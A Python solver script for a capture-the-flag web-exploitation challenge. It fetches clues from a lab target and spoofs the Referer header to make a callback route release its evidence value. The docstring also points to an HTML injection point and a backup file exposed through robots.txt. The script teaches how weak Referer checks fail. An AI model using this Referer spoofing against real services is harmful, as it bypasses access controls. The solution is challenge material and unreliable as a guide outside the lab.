#!/usr/bin/env python3
"""Reflect Upon This (web-exploitation, Day 21) - solver for the callback flow.

Recon, all plain HTTP GET requests against the target:
  1. The target root shows the app. /api/clues returns the feature route, the callback route and a per-target nonce.
  2. The feature route reflects the q parameter as raw HTML (no escaping), so the page is an HTML injection point.
  3. The callback route refuses direct requests (browser_callback_required). It accepts the request when it comes from
     the feature page (Referer), and returns the evidence value (the proof).

Mastery Target 1 (Tiny Uptime) is a different app: its robots.txt disallows /releases-bcb84/, which lists a settings
backup containing the proof. This script covers the Search Mirror target flow only.

usage: python3 solve_reflect_upon_this.py <target base url>   (prints the evidence value; submit it through the GM yourself)
Read-only: no GM calls, no token, no writes. ASCII only."""
import json
import re
import sys
import urllib.parse
import urllib.request


def get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read().decode("utf-8", "replace")


def main(argv):
    if len(argv) != 2:
        print(__doc__)
        return 2
    base = re.match(r"https://[^/]+", argv[1]).group(0)
    clues = json.loads(get(base + "/api/clues"))
    referer = {"Referer": base + clues["feature_route"]}
    cb = base + clues["secondary_route"] + "?" + urllib.parse.urlencode({"nonce": clues["callback_nonce"]})
    ev = json.loads(get(cb, referer))
    print("callback ok:", ev.get("ok"), "| effect:", ev.get("effect"))
    print("evidence:", ev.get("evidence"))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
